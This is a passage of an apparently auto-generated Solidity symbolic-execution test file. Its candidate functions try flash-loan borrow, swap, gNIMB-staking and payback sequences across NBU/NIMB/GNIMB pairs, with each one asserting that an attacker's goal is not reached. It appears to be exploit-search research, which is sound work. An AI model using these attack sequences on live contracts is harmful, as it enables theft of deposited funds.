        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1814(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1815(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1816(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1817(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1818(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1819(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1820(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1821(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1822(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1823(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1824(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1825(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1826(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1827(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1828(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1829(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1830(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1831(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1832(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1833(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1834(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1835(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1836(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1837(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1838(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1839(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1840(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1841(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1842(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1843(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1844(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1845(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1846(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1847(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1848(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1849(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1850(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1851(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1852(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1853(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1854(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1855(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1856(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1857(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1858(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1859(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1860(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1861(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1862(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1863(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1864(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
